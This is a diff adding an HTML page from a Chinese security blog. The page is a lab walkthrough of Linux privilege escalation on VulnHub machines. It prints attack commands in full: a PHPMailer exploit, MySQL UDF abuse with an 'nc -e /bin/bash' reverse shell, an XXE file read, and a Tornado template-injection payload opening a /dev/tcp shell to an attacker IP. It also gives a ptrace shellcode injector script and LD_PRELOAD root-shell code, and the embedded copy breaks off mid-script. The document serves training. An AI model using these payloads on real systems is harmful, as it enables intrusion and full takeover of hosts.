@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capability能力 · 数据库提权 · LD_Preload加载</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@Capability能力,数据库提权,LD_Preload加载
+数据库 环境 https://www.vulnhub.com/entry/raven-2,269/
+1、信息收集：
+dirsearch爆破子目录
+发现有vendor路径和wordpress ``` http://192.168.88.152/vendor/
+找到了发现phpmailer插件,版本为5.2.16 &lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154755.png&#34; alt=&#34;屏幕截图 2025-10-31 154755.png&#34;&gt;&lt;/p&gt; &lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154657.png&#34; alt=&#34;屏幕截图 2025-10-31 154657.png&#34;&gt;&lt;/p&gt; 搜索历史漏洞 2、Web权限获取： searchsploit phpmailer
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 155145.png&#34; alt=&#34;屏幕截图 2025-10-31 155145.png&#34;&gt;&lt;/p&gt; locate php/webapps/40974.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155315.png&#34; alt=&#34;Pasted image 20251031155315.png&#34;&gt;&lt;/p&gt; 复制&#43;修改poc脚本 cp /usr/share/exploitdb/exploits/php/webapps/40969.py poc.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155942.png&#34; alt=&#34;Pasted image 20251031155942.png&#34;&gt;&lt;/p&gt; python poc.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031160606.png&#34; alt=&#34;Pasted image 20251031160606.">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/4.capability%E8%83%BD%E5%8A%9B_%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83_ld_preload%E5%8A%A0%E8%BD%BD/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">
+
+    
+
+
+<script async defer data-website-id="3bfa7bff-77f4-4fe9-ad96-a44d83f72465" src="https://umami-evtq.vercel.app/baize"></script>
+
+    <meta property="og:title" content="Capability能力 · 数据库提权 · LD_Preload加载" />
+<meta property="og:description" content="Capability能力,数据库提权,LD_Preload加载
+数据库 环境 https://www.vulnhub.com/entry/raven-2,269/
+1、信息收集：
+dirsearch爆破子目录
+发现有vendor路径和wordpress ``` http://192.168.88.152/vendor/
+找到了发现phpmailer插件,版本为5.2.16 &lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154755.png&#34; alt=&#34;屏幕截图 2025-10-31 154755.png&#34;&gt;&lt;/p&gt; &lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154657.png&#34; alt=&#34;屏幕截图 2025-10-31 154657.png&#34;&gt;&lt;/p&gt; 搜索历史漏洞 2、Web权限获取： searchsploit phpmailer
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 155145.png&#34; alt=&#34;屏幕截图 2025-10-31 155145.png&#34;&gt;&lt;/p&gt; locate php/webapps/40974.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155315.png&#34; alt=&#34;Pasted image 20251031155315.png&#34;&gt;&lt;/p&gt; 复制&#43;修改poc脚本 cp /usr/share/exploitdb/exploits/php/webapps/40969.py poc.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155942.png&#34; alt=&#34;Pasted image 20251031155942.png&#34;&gt;&lt;/p&gt; python poc.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031160606.png&#34; alt=&#34;Pasted image 20251031160606." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/4.capability%E8%83%BD%E5%8A%9B_%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83_ld_preload%E5%8A%A0%E8%BD%BD/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2025-11-16T00:00:00+08:00" />
+<meta property="article:modified_time" content="2025-11-16T00:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Capability能力 · 数据库提权 · LD_Preload加载"/>
+<meta name="twitter:description" content="Capability能力,数据库提权,LD_Preload加载
+数据库 环境 https://www.vulnhub.com/entry/raven-2,269/
+1、信息收集：
+dirsearch爆破子目录
+发现有vendor路径和wordpress ``` http://192.168.88.152/vendor/
+找到了发现phpmailer插件,版本为5.2.16 &lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154755.png&#34; alt=&#34;屏幕截图 2025-10-31 154755.png&#34;&gt;&lt;/p&gt; &lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154657.png&#34; alt=&#34;屏幕截图 2025-10-31 154657.png&#34;&gt;&lt;/p&gt; 搜索历史漏洞 2、Web权限获取： searchsploit phpmailer
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 155145.png&#34; alt=&#34;屏幕截图 2025-10-31 155145.png&#34;&gt;&lt;/p&gt; locate php/webapps/40974.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155315.png&#34; alt=&#34;Pasted image 20251031155315.png&#34;&gt;&lt;/p&gt; 复制&#43;修改poc脚本 cp /usr/share/exploitdb/exploits/php/webapps/40969.py poc.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155942.png&#34; alt=&#34;Pasted image 20251031155942.png&#34;&gt;&lt;/p&gt; python poc.py
+&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031160606.png&#34; alt=&#34;Pasted image 20251031160606."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://www.hzhsec.top/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "Capability能力 · 数据库提权 · LD_Preload加载",
+      "item": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/4.capability%E8%83%BD%E5%8A%9B_%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83_ld_preload%E5%8A%A0%E8%BD%BD/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Capability能力 · 数据库提权 · LD_Preload加载",
+  "name": "Capability能力 · 数据库提权 · LD_Preload加载",
+  "description": "Capability能力,数据库提权,LD_Preload加载\n数据库 环境 https://www.vulnhub.com/entry/raven-2,269/\n1、信息收集：\ndirsearch爆破子目录\n发现有vendor路径和wordpress ``` http://192.168.88.152/vendor/\n找到了发现phpmailer插件,版本为5.2.16 \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;/static/屏幕截图 2025-10-31 154755.png\u0026#34; alt=\u0026#34;屏幕截图 2025-10-31 154755.png\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;/static/屏幕截图 2025-10-31 154657.png\u0026#34; alt=\u0026#34;屏幕截图 2025-10-31 154657.png\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; 搜索历史漏洞 2、Web权限获取： searchsploit phpmailer\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;/static/屏幕截图 2025-10-31 155145.png\u0026#34; alt=\u0026#34;屏幕截图 2025-10-31 155145.png\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; locate php/webapps/40974.py\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;/static/Pasted image 20251031155315.png\u0026#34; alt=\u0026#34;Pasted image 20251031155315.png\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; 复制+修改poc脚本 cp /usr/share/exploitdb/exploits/php/webapps/40969.py poc.py\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;/static/Pasted image 20251031155942.png\u0026#34; alt=\u0026#34;Pasted image 20251031155942.png\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; python poc.py\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;/static/Pasted image 20251031160606.png\u0026#34; alt=\u0026#34;Pasted image 20251031160606.",
+  "keywords": [
+    "UDF", "Capability", "LD_PRELOAD", "XXE", "Python ptrace", "提权技巧"
+  ],
+  "articleBody": " Capability能力,数据库提权,LD_Preload加载\n数据库 环境 https://www.vulnhub.com/entry/raven-2,269/\n1、信息收集：\ndirsearch爆破子目录\n发现有vendor路径和wordpress ``` http://192.168.88.152/vendor/\n找到了发现phpmailer插件,版本为5.2.16 搜索历史漏洞 2、Web权限获取： searchsploit phpmailer\nlocate php/webapps/40974.py\n复制+修改poc脚本 cp /usr/share/exploitdb/exploits/php/webapps/40969.py poc.py\npython poc.py\n翻到数据库账号密码 ## MYSQL-UDF提权(手工)： 先起一个交互终端 python -c ‘import pty; pty.spawn(\"/bin/bash\")’ php -r ‘$proc=proc_open(\"/bin/bash\",[0=\u003eSTDIN,1=\u003eSTDOUT,2=\u003eSTDERR],$pipes);proc_close($proc);’\n已经编译好的so文件目录 /usr/share/metasploit-framework/data/exploits/mysql /usr/share/sqlmap/data/udf/mysql\n自行编译UDF.so.先确定架构 show variables like ‘%compile%’;\nsearchsploit udf\ncp /usr/share/exploitdb/exploits/linux/local/1518.c .\ngcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc\n编译64位版本的UDF gcc -shared -fPIC -m64 -o udf2.so 1518.c\n简单web python -m http.server 8888\n- 下载到目标上 cd tmp wget http://192.168.88.145:8888/utf.so\n- 连接进行导出调用 ```shell mysql -uroot -pR@v3nSecurity 确认能否执行udf select version(); #查看mysql版本 5.5.60-0+deb8u1默认不启用secure_file_priv\nSHOW VARIABLES LIKE 'secure_file_priv'; select @@basedir; #确认mysql安装位置 show variables like '%basedir%'; #确认mysql安装位置 show variables like '%secure%'; #查看可导出文件位置 show variables like '%plugin%'; #查找插件位置 show variables like '%compile%'; #查看系统版本 use mysql; 创建xiaodi表 create table hzhsec(line blob); 往hzhsec表中插入二进制的udf.so insert into hzhsec values(load_file('/tmp/udf.so')); 导出udf.so select * from hzhsec into dumpfile '/usr/lib/mysql/plugin/udf4.so'; 创建do_system自定义函数 create function do_system returns integer soname 'udf3.so'; select do_system('nc 192.168.88.145 5555 -e /bin/bash'); 工具梭哈 查看root是否支持远程登录\nSELECT user, host FROM mysql.user WHERE user = 'root'; 很明显不支持 开启远程登录 GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'v3nSecurity' WITH GRANT OPTION; flush privileges; 由于没有开放3306端口,这个利用不了\nCapability能力 Capability能力,简单来说就是一个方便的权限管理的机制\n原理参考： https://www.cnblogs.com/f-carey/p/16026088.html\ncp /usr/bin/php /tmp/php 设置能力：setcap cap_setuid+ep /tmp/php 删除能力：setcap -r /tmp/php 查看单个能力：getcap /usr/bin/php 查看所有能力：getcap -r / 2\u003e/dev/null Hacker_Kid靶场\nWP参考： https://www.jianshu.com/p/60673ac0454f\n环境： https://www.vulnhub.com/entry/hacker-kid-101,719/\n权限获取 端口扫描\n看到80端口开放,查看网页 为静态网页,观察前端源码提示,拼接get请求参数 http://192.168.88.153/?page_no=1 到page=21时显示提示\n根据提示使用dig查看 192.168.88.153 hackers.blackhat.local其他的子域名 dig hackers.blackhat.local @192.168.88.153 发现子域名 hackerkid.blackhat.local\n修改hosts文件 windows : C:\\Windows\\System32\\drivers\\etc\n192.168.88.153 hackerkid.blackhat.local 192.168.88.153 hackers.blackhat.local 访问hackers.blackhat.local,看到另一个网页\n拦截数据包 发现存在xml输入,测试是否有XXE漏洞 email参数有回显\n注入xxepayload,成功回显 看出只有root和saket是可登录用户 读取当前用户的文件 /home/saket/.bashrc 返回值被拦截了用伪协议\n解码获取账号密码 推测是用户saket的 来到9999端口,有登录页面,成功登录用户saket saket Saket!#$%@!! name参数发现模板注入\nhttp://hackerkid.blackhat.local:9999/?name={{7*7}} 由于是端口9999,推测（9999端口，Tornado）\n{% import os %}{{os.system('bash -c \"bash -i \u0026\u003e /dev/tcp/192.168.88.145/6688 0\u003e\u00261\"')}} 反弹shell,要进行url编码\nhttp://hackerkid.blackhat.local:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F192.168.88.145%2F6688%200%3E%261%22')%7D%7D 权限提升 获取Capability能力的概况\n/sbin/getcap -r / 2\u003e/dev/null 参考见附录\n/usr/bin/python2.7 = cap_sys_ptrace+ep python2.7拥有cap_sys_ptrace权限，意味着他可以调试别的进程，对进程进行内存修改及查看等活动，利用提权脚本： 脚本inject.py见附录\n控制主机下载\npython -m http.server 8080 wget http://192.168.88.145:8888/inject.py 批量注入命令\nfor i in `ps -ef|grep root|grep -v \"grep\"|awk '{print $2}'`; do python2.7 inject.py $i; done 查看是否成功\nnetstat -ano | grep 5600 远程连接 nc 192.168.88.153 5600 结论：suid升级版，更细致的权限划分，通过能力有哪些权限设置进行利用\nLD_Preload加载 参考： https://www.cnblogs.com/backlion/p/10503985.html\n修改/etc/sudoers\nDefaults env_keep += LD_PRELOAD 将用户hzhsec添加到sudo默认不用密码\nhzhsec ALL=(ALL:ALL) NOPASSWD: /usr/bin/find 目录中创建shell.c文件 交互终端\npython -c 'import pty; pty.spawn(\"/bin/bash\")' #include #include #include void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); } 编译它以生成一个带有.so扩展名的共享对象，同样在Windows操作系统中使用.dll文件\ngcc -fPIC -shared -o shell.so shell.c -nostartfiles ls -al shell.so 获取root权限\nsudo LD_PRELOAD=/tmp/shell.so find whoami 注意,和sudo提权有区别 当修改成无法通过sudo利用的文件时\nhzhsec ALL=(ALL:ALL) NOPASSWD: /tmp/hzh.sh hzh.sh内容只有一个ls\nsudo LD_PRELOAD=/tmp/shell.so /tmp/hzh.sh 同样执行成功\n**结论**：sudo提权有限制，但是一旦设置了LD_PRELOAD，那么只要有程序既可提权 附录 权限参考\nCAP_CHOWN 0 允许改变文件的所有权 CAP_DAC_OVERRIDE 1 忽略对文件的所有DAC访问限制 CAP_DAC_READ_SEARCH 2 忽略所有对读、搜索操作的限制 CAP_FOWNER 3 以最后操作的UID,覆盖文件的先前的UID CAP_FSETID 4 确保在文件被修改后不修改setuid/setgid位 CAP_KILL 5 允许对不属于自己的进程发送信号 CAP_SETGID 6 允许改变组ID CAP_SETUID 7 允许改变用户ID CAP_SETPCAP 8 允许向其它进程转移能力以及删除其它进程的任意能力(只限init进程) CAP_LINUX_IMMUTABLE 9 允许修改文件的不可修改(IMMUTABLE)和只添加(APPEND-ONLY)属性 CAP_NET_BIND_SERVICE 10 允许绑定到小于1024的端口 CAP_NET_BROADCAST 11 允许网络广播和多播访问(未使用) CAP_NET_ADMIN 12 允许执行网络管理任务：接口、防火墙和路由等. CAP_NET_RAW 13 允许使用原始(raw)套接字 CAP_IPC_LOCK 14 允许锁定共享内存片段 CAP_IPC_OWNER 15 忽略IPC所有权检查 CAP_SYS_MODULE 16 插入和删除内核模块 CAP_SYS_RAWIO 17 允许对ioperm/iopl的访问 CAP_SYS_CHROOT 18 允许使用chroot()系统调用 CAP_SYS_PTRACE 19 允许跟踪任何进程 CAP_SYS_PACCT 20 允许配置进程记帐(process accounting) CAP_SYS_ADMIN 21 允许执行系统管理任务：加载/卸载文件系统、设置磁盘配额、开/关交换设备和文件等. CAP_SYS_BOOT 22 允许重新启动系统 CAP_SYS_NICE 23 允许提升优先级，设置其它进程的优先级 CAP_SYS_RESOURCE 24 忽略资源限制 CAP_SYS_TIME 25 允许改变系统时钟 CAP_SYS_TTY_CONFIG 26 允许配置TTY设备 CAP_MKNOD 27 允许使用mknod()系统调用 CAP_LEASE 28 允许在文件上建立租借锁 CAP_SETFCAP 31 允许在指定的程序上授权能力给其它程序 inject.py\nimport ctypes import sys import struct # Macros defined in # https://code.woboq.org/qt5/include/sys/ptrace.h.html PTRACE_POKETEXT = 4 PTRACE_GETREGS = 12 PTRACE_SETREGS = 13 PTRACE_ATTACH = 16 PTRACE_DETACH = 17 # Structure defined in # https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct class user_regs_struct(ctypes.Structure): _fields_ = [ (\"r15\", ctypes.c_ulonglong), (\"r14\", ctypes.c_ulonglong), (\"r13\", ctypes.c_ulonglong), (\"r12\", ctypes.c_ulonglong), (\"rbp\", ctypes.c_ulonglong), (\"rbx\", ctypes.c_ulonglong), (\"r11\", ctypes.c_ulonglong), (\"r10\", ctypes.c_ulonglong), (\"r9\", ctypes.c_ulonglong), (\"r8\", ctypes.c_ulonglong), (\"rax\", ctypes.c_ulonglong), (\"rcx\", ctypes.c_ulonglong), (\"rdx\", ctypes.c_ulonglong), (\"rsi\", ctypes.c_ulonglong), (\"rdi\", ctypes.c_ulonglong), (\"orig_rax\", ctypes.c_ulonglong), (\"rip\", ctypes.c_ulonglong), (\"cs\", ctypes.c_ulonglong), (\"eflags\", ctypes.c_ulonglong), (\"rsp\", ctypes.c_ulonglong), (\"ss\", ctypes.c_ulonglong), (\"fs_base\", ctypes.c_ulonglong), (\"gs_base\", ctypes.c_ulonglong), (\"ds\", ctypes.c_ulonglong), (\"es\", ctypes.c_ulonglong), (\"fs\", ctypes.c_ulonglong), (\"gs\", ctypes.c_ulonglong), ] libc = ctypes.CDLL(\"libc.so.6\") pid=int(sys.argv[1]) # Define argument type and respone type. libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p] libc.ptrace.restype = ctypes.c_uint64 # Attach to the process libc.ptrace(PTRACE_ATTACH, pid, None, None) registers=user_regs_struct() # Retrieve the value stored in registers libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers)) print(\"Instruction Pointer: \" + hex(registers.rip)) print(\"Injecting Shellcode at: \" + hex(registers.rip)) # Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c shellcode = \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\x31\\xf6\\xff\\xc6\\x6a\\x29\\x58\\x6a\\x02\\x5f\\x0f\\x05\\x48\\x97\\x6a\\x02\\x66\\xc7\\x44\\x24\\x02\\x15\\xe0\\x54\\x5e\\x52\\x6a\\x31\\x58\\x6a\\x10\\x5a\\x0f\\x05\\x5e\\x6a\\x32\\x58\\x0f\\x05\\x6a\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\xff\\xce\\xb0\\x21\\x0f\\x05\\x75\\xf8\\xf7\\xe6\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x8d\\x3c\\x24\\xb0\\x3b\\x0f\\x05\" # Inject the shellcode into the running process byte by byte. for i in xrange(0,len(shellcode),4): # Convert the byte to little endian. shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16) shellcode_byte_little_endian=struct.pack(\"",
+  "wordCount" : "754",
+  "inLanguage": "en",
+  "datePublished": "2025-11-16T00:00:00+08:00",
+  "dateModified": "2025-11-16T00:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/4.capability%E8%83%BD%E5%8A%9B_%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83_ld_preload%E5%8A%A0%E8%BD%BD/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsec home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://www.hzhsec.top/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/static/hzhsec.png">
+
+<link rel="manifest" href="/static/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>Capability能力 · 数据库提权 · LD_Preload加载</h1>
+  </header>
+
+  <p>
+  <small>
+    November 16, 2025&nbsp;· 754 words&nbsp;· 4 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#确认能否执行udf">确认能否执行udf</a>
+      <ul>
+        <li><a href="#创建xiaodi表">创建xiaodi表</a></li>
+        <li><a href="#往hzhsec表中插入二进制的udfso">往hzhsec表中插入二进制的udf.so</a></li>
+        <li><a href="#导出udfso">导出udf.so</a></li>
+        <li><a href="#创建do_system自定义函数">创建do_system自定义函数</a></li>
+      </ul>
+    </li>
+    <li><a href="#工具梭哈">工具梭哈</a>
+      <ul>
+        <li><a href="#开启远程登录">开启远程登录</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#权限获取">权限获取</a></li>
+    <li><a href="#权限提升">权限提升</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><hr>
+<p>Capability能力,数据库提权,LD_Preload加载</p>
+<h1 id="数据库">数据库</h1>
+<p>环境
+<a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p>
+<p>1、信息收集：</p>
+<p>dirsearch爆破子目录</p>
+<p align="center"><img src="/static/屏幕截图 2025-10-31 153511.png" alt="屏幕截图 2025-10-31 153511.png"></p>
+发现有vendor路径和wordpress
+```
+<p><a href="http://192.168.88.152/vendor/">http://192.168.88.152/vendor/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>找到了发现phpmailer插件,版本为5.2.16
+</span></span><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154755.png&#34; alt=&#34;屏幕截图 2025-10-31 154755.png&#34;&gt;&lt;/p&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 154657.png&#34; alt=&#34;屏幕截图 2025-10-31 154657.png&#34;&gt;&lt;/p&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>搜索历史漏洞
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2、Web权限获取：
+</span></span></code></pre></div><p>searchsploit phpmailer</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/屏幕截图 2025-10-31 155145.png&#34; alt=&#34;屏幕截图 2025-10-31 155145.png&#34;&gt;&lt;/p&gt;
+</span></span></code></pre></div><p>locate php/webapps/40974.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155315.png&#34; alt=&#34;Pasted image 20251031155315.png&#34;&gt;&lt;/p&gt;
+</span></span><span style="display:flex;"><span>复制+修改poc脚本
+</span></span></code></pre></div><p>cp /usr/share/exploitdb/exploits/php/webapps/40969.py poc.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031155942.png&#34; alt=&#34;Pasted image 20251031155942.png&#34;&gt;&lt;/p&gt;
